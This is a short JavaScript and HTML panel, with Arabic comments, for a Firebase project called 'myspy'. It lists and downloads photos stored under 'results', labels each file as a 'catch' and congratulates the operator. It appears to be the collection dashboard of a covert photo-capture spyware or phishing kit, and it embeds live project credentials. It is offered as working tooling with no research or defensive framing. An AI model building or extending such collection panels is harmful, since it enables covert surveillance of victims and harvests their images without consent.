<script>
    const firebaseConfig = { 
        apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U", 
        authDomain: "myspy-2579b.firebaseapp.com", 
        projectId: "myspy-2579b", 
        storageBucket: "myspy-2579b.firebasestorage.app", 
        messagingSenderId: "487846863334", 
        appId: "1:487846863334:web:b58620e6f34d187e02b627" 
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // هنا التعديل: هنراقب كل النتائج (results) مش مسار واحد بس
    db.ref('results').on('value', (snapshot) => {
        const list = document.getElementById('list');
        list.innerHTML = ''; // تنظيف القائمة عشان ميحصلش تكرار
        
        const allData = snapshot.val();
        if (allData) {
            // بنلف على كل المجلدات اللي جوه results
            Object.keys(allData).forEach(key => {
                const item = allData[key];
                
                // لو البيانات عبارة عن صور كتير جوه بعض (نظام الـ 7 صور)
                if (typeof item === 'object') {
                    Object.keys(item).forEach(subKey => {
                        renderPhoto(item[subKey]);
                    });
                } else {
                    renderPhoto(item);
                }
            });
        }
    });

    function renderPhoto(data) {
        const card = document.createElement('div');
        card.className = 'card';
        card.style = "border:2px solid #f00; padding:10px; border-radius:15px; background:#111; width:280px; margin:10px;";
        card.innerHTML = `
            <img src="${data.photo}" style="width:100%; border-radius:10px;" onclick="window.open(this.src)">
            <p style="font-size:12px; color:#aaa;">${data.date}</p>
            <button onclick="downloadImg('${data.photo}')" style="background:#f00; color:#fff; width:100%; padding:10px; border:none; border-radius:8px; font-weight:bold; cursor:pointer;">حفظ في المعرض 📥</button>
        `;
        document.getElementById('list').prepend(card);
    }

    function downloadImg(base64) {
        const a = document.createElement('a');
        a.href = base64;
        a.download = `صيدة_${Date.now()}.jpg`;
        a.click();
        alert("نزلت في المعرض يا وحش! 🔥");
    }
</script>
